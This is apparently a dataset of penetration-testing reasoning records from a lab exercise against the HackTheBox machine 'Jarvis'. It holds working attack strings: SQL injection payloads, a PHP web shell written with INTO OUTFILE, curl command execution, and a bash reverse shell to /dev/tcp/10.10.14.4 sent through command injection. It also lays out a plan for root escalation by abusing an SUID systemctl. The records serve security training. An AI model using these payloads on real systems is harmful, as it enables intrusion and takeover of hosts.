   - This accomplishment is significant as it marks the transition from the lower-privileged `www-data` user to the `pepper` user, potentially opening up new avenues for further exploration and exploitation within the system.

2. **Key Findings and Implications for Further Steps**:
   - **Achieved User Privilege Level**: Gaining access as the `pepper` user suggests that there may be additional sensitive files, commands, or services accessible that were not available to `www-data`. This user might have different permissions or access controls set, which could lead to further privilege escalation opportunities.
   - **Potential for Further Privilege Escalation**: Given that `pepper` is likely to have different and potentially more extensive privileges than `www-data`, there is a strong rationale to investigate this user’s environment more thoroughly. This includes checking for sudo privileges, cron jobs, writable configuration files, or other executables that `pepper` can run with elevated privileges.

3. **Strategy Evaluation and Next Steps**:
   - **Enumerate the Machine**: The next logical step is to conduct a thorough enumeration of the machine from the perspective of the `pepper` user. This includes listing directory contents, checking running processes, reviewing scheduled tasks, and examining user permissions and group memberships.
   - **Identify Privilege Escalation Vectors**: During enumeration, special attention should be given to finding misconfigurations, unprotected files or scripts that `pepper` can edit, and commands or applications that `pepper` can execute with sudo privileges without a password. Tools like `linpeas` or manual checks such as `sudo -l`, checking `/etc/cron*` directories, and `.bash_history` can be invaluable here.
   - **Continue with the Current Strategy**: Since gaining access as `pepper` has opened up new potential for discovering vulnerabilities, continuing with the strategy of enumerating the system for further privilege escalation paths is both necessary and promising. This step is crucial for a deeper penetration into the system, aiming to gain root access or access to sensitive data.

Given the successful elevation to the `pepper` user and the potential for uncovering new vulnerabilities or misconfigurations at this higher privilege level, the strategy to enumerate the system is well-founded and essential. This approach will help in identifying further security weaknesses and in planning the subsequent steps for either gaining higher privileges or securing the system against similar attack vectors.","Explore the suspicious files, commands and create a summary of the findings.","1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) indicates successful access to the system as the user `pepper` through the exploitation of a command injection vulnerability in the `simpler.py` script. This access provides a unique opportunity to explore the system from the perspective of this user, who may have different privileges than the previously compromised `www-data` user.
   - Access as `pepper` potentially opens up avenues to sensitive files, commands, or services that were not previously accessible, offering a strategic advantage in the penetration testing process.

2. **Key Findings Leading to Further Steps**:
   - **Achieved User Privilege Level**: The current access level as `pepper` suggests that this user could have permissions that allow interaction with files or commands that could lead to further privilege escalation.
   - **Exploration of User Environment**: Given that `pepper` might have access to different system resources, there is a critical need to explore this environment thoroughly. This includes examining files, directories, running processes, and accessible commands that `pepper` can execute, which might reveal misconfigurations or vulnerabilities.

3. **Logical Progression to Selected Step**:
   - **Explore Suspicious Files and Commands**: The next logical step is to meticulously explore files, commands, and their associated privileges under the `pepper` user. This includes looking for files with unusual permissions, scripts that can be modified or executed, and any scheduled tasks (cron jobs) that might be exploited.
   - **Create a Summary of Findings**: As the exploration progresses, it is crucial to document and summarize findings systematically. This summary should include details such as file locations, permissions, command outputs, and any indications of misconfigurations or potential vectors for further privilege escalation.
   - **Identify Potential Privilege Escalation Vectors**: Through the detailed exploration, identify any files or commands that could potentially be exploited to escalate privileges. This might involve writable scripts that are executed as a higher-privileged user, misconfigured services, or exploitable binaries indicated by tools like `sudo -l` or manual inspection.

4. **Ethical and Security Considerations**:
   - **Controlled Exploration**: Ensure that the exploration is controlled and does not cause unintended damage to the system. This involves avoiding modifications to system files or configurations unless absolutely necessary and within the scope of authorized testing.
   - **Documentation and Reporting**: Maintain comprehensive documentation of all actions taken and findings discovered. This documentation is crucial not only for replicating the findings in future tests but also for preparing a detailed report for the system administrators to address the vulnerabilities.

By moving forward with the strategy to explore the system environment under the `pepper` user, we leverage the current access level to potentially uncover further security weaknesses. This step is essential for a deeper understanding of the system's security posture and for preparing effective recommendations for mitigating discovered vulnerabilities. This approach aligns with the goals of thorough penetration testing and responsible reporting.","{'Interactive CLI': ""Explore files, directories, and running processes as user 'pepper'."", 'Google search': 'Research potential privilege escalation vectors based on findings.'}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)
   1.9 Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} (completed)
       1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} (completed)
       1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell""); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} (completed)
       1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} (completed)
       1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} (completed)
   2.0 Privilege Escalation - [to-do]
       2.1 Sudo Privileges Analysis for User www-data on Server ""Jarvis"" - (completed)
           2.1.1 Context - {Investigation of `sudo` permissions for the user `www-data`} (completed)
           2.1.2 Environment Details - {Server: Jarvis; Location: `/var/www/html`} (completed)
           2.1.3 Sudo Permissions - {Command: `sudo -l`; Defaults Entries: `env_reset` ensures a minimal environment is passed to the command, `mail_badpass` sends an email if a bad password is entered, `secure_path` specifies a secure PATH setting (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`)} (completed)
           2.1.4 Privileged Commands - {Permitted Command for www-data: Target User: pepper; Command: `/var/www/Admin-Utilities/simpler.py`; Permission: NOPASSWD (No password required for execution)} (completed)
           2.1.5 Security Implications - {The `www-data` user has passwordless `sudo` rights to execute `simpler.py` as the user `pepper`. This configuration can be potentially exploited if `simpler.py` is vulnerable to tampering or if `www-data` is compromised} (completed)
           2.1.6 Recommendations - {Review and Secure `simpler.py`: Ensure that `simpler.py` does not contain exploitable code or vulnerabilities that could be used to escalate privileges or execute arbitrary code. Implement strict access controls and regular audits on `simpler.py` to prevent unauthorized modifications. Limit Sudo Privileges: Reassess the necessity of granting `sudo` permissions to `www-data` for executing scripts as other users, especially without a password. Consider implementing command restrictions or requiring a password for sensitive operations to enhance security. Audit and Monitoring: Set up comprehensive logging and monitoring for actions performed using `sudo`, particularly for scripts executed with elevated privileges. Regularly review logs for unusual or unauthorized `sudo` activity. Incident Response Preparedness: Develop and test incident response plans that include scenarios of privilege escalation and unauthorized access through misuse of `sudo` privileges. This configuration should be carefully managed to prevent potential security breaches, considering the high level of access granted by these permissions} (completed)
       2.2 Security Analysis of Python Script for Command Injection Vulnerability - (completed)
           2.2.1 Script Functionality - {Purpose: Executes a ping command based on user input. Function: `exec_ping()`. Input Handling: Takes an IP address from user input and attempts to ping it} (completed)
           2.2.2 Security Measures in Place - {Filtered Characters: The script explicitly blocks a set of characters (`&`, `;`, `-.`, `` ` ``, `||`, `|`) to prevent command injection} (completed)
           2.2.3 Vulnerability Assessment - {Unfiltered Characters: The script does not block the use of `$`, `(`, and `)` characters. Potential Exploit: These unblocked characters can be used for bash command substitution (e.g., `$(cmd)`), which may allow an attacker to inject additional commands} (completed)
           2.2.4 Exploit Test - {Method: Use the script to test if command substitution (`$(cmd)`) allows execution of unintended commands. Example Test Input: Entering `127.0.0.1 $(id)` as the IP address to see if the script inadvertently executes the `id` command} (completed)
           2.2.5 Security Implications - {Allowing command substitution presents a significant security risk, potentially enabling attackers to execute arbitrary commands on the server or local machine where the script is running} (completed)
           2.2.6 Recommendations - {Enhance Input Validation: Update the script to filter out additional special characters and patterns that could lead to command injection, including `$`, `(`, and `)`. Use Secure Functions: Replace `os.system()` with more secure alternatives like `subprocess.run()`, which can safely handle command parameters without the risk of shell injection. Ensure commands are passed as lists to `subprocess.run()` to avoid shell interpretation. Security Testing: Implement automated tests to check for common injection patterns. Regularly update the list of forbidden characters based on emerging threats and exploit techniques. Code Audits: Conduct regular code reviews and security audits to identify and mitigate potential vulnerabilities. Educate developers on secure coding practices, particularly regarding input validation and handling external commands} (completed)
       2.3 Command Injection Exploit Analysis and Reverse Shell Execution - (completed)
           2.3.1 Initial Command Substitution Test - {Observation: Using command substitution, the username ""pepper"" was injected, and the system attempted to resolve it as a hostname, confirming that command execution via substitution was successful} (completed)
           2.3.2 Exploitation Strategy - {Objective: Gain a shell with the privileges of the user ""pepper"". Method: Due to restrictions on some special characters, the plan involves writing a reverse shell script and executing it through command injection} (completed)
           2.3.3 Steps to Execute the Reverse Shell - {1. Script Creation: Command: `echo 'bash -c ""bash -i >& /dev/tcp/10.10.14.4/4444 0>&1""' > /tmp/shell.sh`, Purpose: Writes a bash reverse shell script that connects back to the attacker's machine at `10.10.14.4` on port `4444`. 2. Make Script Executable: Command: `chmod a+x /tmp/shell.sh`, Purpose: Changes the permissions of `shell.sh` to ensure it is executable. 3. Execute Script via Command Injection: Injection Point: Within the `simpler.py` script execution context, using `sudo -u pepper`. Injected Command: `$(/tmp/shell.sh)`, Result: Successfully obtained a reverse shell as the user ""pepper""} (completed)
           2.3.4 Security Implications - {The ability to write and execute arbitrary scripts highlights significant security weaknesses, particularly around input validation and privilege management. Execution of arbitrary code as another user (pepper) via command injection poses a severe security risk, potentially leading to unauthorized access and control over the system} (completed)
           2.3.5 Recommendations - {Immediate Remediation: Remove the `shell.sh` script and audit the system for any other malicious files or scripts. Patch the vulnerabilities in the `simpler.py` script to prevent further exploitation. Enhance Security Measures: Implement stringent input validation in all scripts and applications to prevent command injection. Review and restrict sudo permissions to minimize the risk of privilege escalation. Regularly update and audit security policies and practices to address new and emerging threats. Monitoring and Logging: Enhance monitoring of system logs for unusual activities that could indicate attempted or successful exploitation. Set up alerts for unauthorized changes to critical files and configurations} (completed)
       2.4 Security Analysis: SUID Enumeration and Systemctl Exploitation - (completed)
           2.4.1 Objective - {Identify potential security vulnerabilities related to SUID (Set Owner User ID on execution) files on the system} (completed)
           2.4.2 Findings from SUID Enumeration - {Command Used: `find / -perm -4000 2>/dev/null`; SUID Files Identified: `/bin/fusermount`, `/bin/mount`, `/bin/ping`, `/bin/systemctl` (notably not SUID by default), `/bin/umount`, `/bin/su`; Additional files truncated in the report} (completed)
           2.4.3 Key Observation - {Systemctl as SUID: The presence of `systemctl` with SUID permissions is unusual as it is not set as SUID by default. This configuration can be exploited because `systemctl` is used to manage system services} (completed)
           2.4.4 Potential Exploitation Path - {Tool: `systemctl` (used to manage and control systemd services); Normal Configuration Location: `/etc/system/systemd` (not writable by non-root users); Exploitation Method: Utilize the `systemctl link` command to manipulate service links, potentially allowing escalation of privileges or unauthorized system modifications} (completed)
           2.4.5 Security Implications - {An SUID `systemctl` can provide an attacker with mechanisms to interact with system services in a way that may lead to privilege escalation. The ability to write or manipulate service files or links could allow an attacker to execute commands as root, compromising the entire system} (completed)
           2.4.6 Recommendations - {Immediate Action: Verify whether `systemctl` should have SUID permissions and remove these permissions if they are not necessary. Long-Term Security Measures: Audit all SUID files on the system to ensure they are legitimate and necessary. Implement strict filesystem permissions and access controls, particularly for critical system binaries and configuration files. Regularly review and update system and service configurations to close any loopholes that could be exploited for privilege escalation. Monitoring and Logging: Enhance system monitoring to detect and alert on unauthorized changes to SUID files or service configurations. Ensure comprehensive logging of system commands, particularly those related to service management, to aid in forensic investigations} (completed)",Enumerate the machine to find more information for privilege escalatino,"1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) indicates successful access to the system as the user `pepper` through the exploitation of a command injection vulnerability in the `simpler.py` script. This access provides a unique opportunity to explore the system from the perspective of this user, who may have different privileges than the previously compromised `www-data` user.
   - Access as `pepper` potentially opens up avenues to sensitive files, commands, or services that were not previously accessible, offering a strategic advantage in the penetration testing process.

2. **Key Findings Leading to Further Steps**:
   - **Achieved User Privilege Level**: The current access level as `pepper` suggests that this user could have permissions that allow interaction with files or commands that could lead to further privilege escalation.
   - **Exploration of User Environment**: Given that `pepper` might have access to different system resources, there is a critical need to explore this environment thoroughly. This includes examining files, directories, running processes, and accessible commands that `pepper` can execute, which might reveal misconfigurations or vulnerabilities.

3. **Logical Progression to Selected Step**:
   - **Explore Suspicious Files and Commands**: The next logical step is to meticulously explore files, commands, and their associated privileges under the `pepper` user. This includes looking for files with unusual permissions, scripts that can be modified or executed, and any scheduled tasks (cron jobs) that might be exploited.
   - **Create a Summary of Findings**: As the exploration progresses, it is crucial to document and summarize findings systematically. This summary should include details such as file locations, permissions, command outputs, and any indications of misconfigurations or potential vectors for further privilege escalation.
   - **Identify Potential Privilege Escalation Vectors**: Through the detailed exploration, identify any files or commands that could potentially be exploited to escalate privileges. This might involve writable scripts that are executed as a higher-privileged user, misconfigured services, or exploitable binaries indicated by tools like `sudo -l` or manual inspection.

4. **Ethical and Security Considerations**:
   - **Controlled Exploration**: Ensure that the exploration is controlled and does not cause unintended damage to the system. This involves avoiding modifications to system files or configurations unless absolutely necessary and within the scope of authorized testing.
   - **Documentation and Reporting**: Maintain comprehensive documentation of all actions taken and findings discovered. This documentation is crucial not only for replicating the findings in future tests but also for preparing a detailed report for the system administrators to address the vulnerabilities.

By moving forward with the strategy to explore the system environment under the `pepper` user, we leverage the current access level to potentially uncover further security weaknesses. This step is essential for a deeper understanding of the system's security posture and for preparing effective recommendations for mitigating discovered vulnerabilities. This approach aligns with the goals of thorough penetration testing and responsible reporting.","**Security Analysis: SUID Enumeration and Systemctl Exploitation**

- **Objective:** Identify potential security vulnerabilities related to SUID (Set Owner User ID on execution) files on the system.

- **Findings from SUID Enumeration:**
  - **Command Used:** `find / -perm -4000 2>/dev/null`
  - **SUID Files Identified:**
    - `/bin/fusermount`
    - `/bin/mount`
    - `/bin/ping`
    - `/bin/systemctl` (notably not SUID by default)
    - `/bin/umount`
    - `/bin/su`
    - Additional files truncated in the report.

- **Key Observation:**
  - **Systemctl as SUID:** The presence of `systemctl` with SUID permissions is unusual as it is not set as SUID by default. This configuration can be exploited because `systemctl` is used to manage system services.

- **Potential Exploitation Path:**
  - **Tool:** `systemctl` (used to manage and control systemd services)
  - **Normal Configuration Location:** `/etc/system/systemd` (not writable by non-root users)
  - **Exploitation Method:** Utilize the `systemctl link` command to manipulate service links, potentially allowing escalation of privileges or unauthorized system modifications.

- **Security Implications:**
  - An SUID `systemctl` can provide an attacker with mechanisms to interact with system services in a way that may lead to privilege escalation.
  - The ability to write or manipulate service files or links could allow an attacker to execute commands as root, compromising the entire system.

- **Recommendations:**
  1. **Immediate Action:**
     - Verify whether `systemctl` should have SUID permissions and remove these permissions if they are not necessary.
  
  2. **Long-Term Security Measures:**
     - Audit all SUID files on the system to ensure they are legitimate and necessary.
     - Implement strict filesystem permissions and access controls, particularly for critical system binaries and configuration files.
     - Regularly review and update system and service configurations to close any loopholes that could be exploited for privilege escalation.
  
  3. **Monitoring and Logging:**
     - Enhance system monitoring to detect and alert on unauthorized changes to SUID files or service configurations.
     - Ensure comprehensive logging of system commands, particularly those related to service management, to aid in forensic investigations.

By addressing these points, the security posture against the misuse of system binaries like `systemctl` can be significantly enhanced, thereby protecting the system from potential privilege escalation attacks.",Find a method to use systemctl link command to escalate privileges,"1. **Evaluation of Previous Step Achievement**:
   - The previous step in the penetration testing task list (PTT) was focused on enumerating SUID files on the system. This step was successfully completed, and key findings were documented. Among the SUID files found, `systemctl` was identified as having SUID permissions, which is unusual because `systemctl` typically does not have SUID permissions by default.
   - This finding is significant as it indicates a potential misconfiguration that could be exploited for privilege escalation, given the capabilities of `systemctl` in managing system services.

2. **Key Findings and Implications for Further Steps**:
   - **Unusual SUID Permission on Systemctl**: The presence of SUID permissions on `systemctl` suggests that it can be run with root privileges by any user. This is a critical finding because `systemctl` can control services, potentially allowing an attacker to manipulate these services to execute arbitrary code as the root user.
   - **Potential Exploitation Path**: The ability to use `systemctl` to link and manage custom or malicious service files could lead to a privilege escalation. This method involves creating a new service file that executes a chosen command or script with root privileges and then using `systemctl` to enable and start this service.

3. **Strategy Evaluation and Next Steps**:
   - **Exploitation of Systemctl SUID Configuration**: Given the current findings, the next logical step is to exploit the SUID configuration of `systemctl`. This involves crafting a malicious service file that, when executed as a service, will run with root privileges, effectively escalating the privileges of the attacker from a lower-privileged user to root.
   - **Methodology for Privilege Escalation**:
     - Create a malicious service file that includes a command to execute a reverse shell or a similar payload.
     - Use the `systemctl link` command to add this service to the system's service management.
     - Start the service using `systemctl start`, which will execute the payload with root privileges due to the SUID bit set on `systemctl`.
   - **Continue with the Current Strategy**: The discovery of the SUID bit set on `systemctl` provides a clear pathway for privilege escalation. It is both necessary and promising to continue with this strategy as it directly leverages the identified misconfiguration for security testing.

The strategy to exploit the SUID configuration of `systemctl` is well-founded based on the security implications of the findings. This approach is crucial for demonstrating the potential security risk associated with misconfigurations and for providing concrete examples of how such vulnerabilities could be exploited in real-world scenarios. This step is essential for enhancing the overall security posture of the system by addressing and mitigating discovered vulnerabilities.",Do a google search for more information,"1. **Assessment of Current Strategic Position**:
   - The updated Penetration Testing Task List (PTT) highlighted the unusual SUID permissions set on `systemctl`. This discovery is critical as `systemctl` is a powerful tool used for managing system services, and its misconfiguration (SUID bit set) can potentially be exploited to escalate privileges.
   - Given the capabilities of `systemctl` when operating with elevated privileges, it becomes a prime target for exploitation, particularly in scenarios where an attacker seeks to elevate from a lower-privileged user to root.

2. **Key Findings Leading to Further Steps**:
   - **Unusual SUID Configuration**: The SUID bit set on `systemctl` is not typical and presents a unique opportunity for exploitation. This configuration allows any user to execute `systemctl` with root privileges.
   - **Potential for Privilege Escalation**: The ability to manipulate system services through `systemctl` can lead to executing arbitrary commands as the root user, thus achieving privilege escalation.

3. **Logical Progression to Selected Step**:
   - **Google Search for Exploitation Techniques**: To effectively exploit the identified vulnerability, detailed and specific knowledge about exploiting SUID configurations on `systemctl` is required. A Google search is the most straightforward approach to gather this information. This search can provide insights into known exploits, step-by-step guides, or community-shared vulnerabilities related to SUID and `systemctl`.
   - **Gathering and Analyzing Information**:
     - Search for terms like ""exploit SUID systemctl"", ""systemctl SUID privilege escalation"", or ""systemctl link exploit"".
     - Review credible sources such as security blogs, forums like Stack Exchange, GitHub for exploit scripts, and databases like Exploit-DB.
   - **Reference and Documentation**:
     - Document the sources of information that provide reliable and tested methods to exploit the SUID configuration on `systemctl`.
     - Use the gathered information to craft a proof-of-concept or a step-by-step exploitation guide based on the system's configuration and the current access level.

4. **Ethical and Security Considerations**:
   - **Responsible Use of Information**: Ensure that the information gathered and the methods employed are used responsibly within the scope of authorized penetration testing activities. Avoid testing on systems where explicit permission has not been granted.
   - **Documentation and Reporting**: Maintain a clear record of all sources and methods used during the testing. This documentation will be crucial for reporting the vulnerability to system administrators and for recommending mitigations.

By conducting a targeted Google search to gather more information on exploiting the SUID set `systemctl`, the strategy aligns directly with the objective of escalating privileges securely and effectively. This step is essential for understanding the technical details of the potential exploit and for preparing to demonstrate and mitigate the vulnerability responsibly.","{'Google search': ""Search for exploitation techniques related to SUID permissions on systemctl, including terms like 'exploit SUID systemctl', 'systemctl SUID privilege escalation', and 'systemctl link exploit'.""}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)
   1.9 Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} (completed)
       1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} (completed)
       1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell""); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} (completed)
       1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} (completed)
       1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} (completed)
   2.0 Privilege Escalation - [to-do]
       2.1 Sudo Privileges Analysis for User www-data on Server ""Jarvis"" - (completed)
           2.1.1 Context - {Investigation of `sudo` permissions for the user `www-data`} (completed)
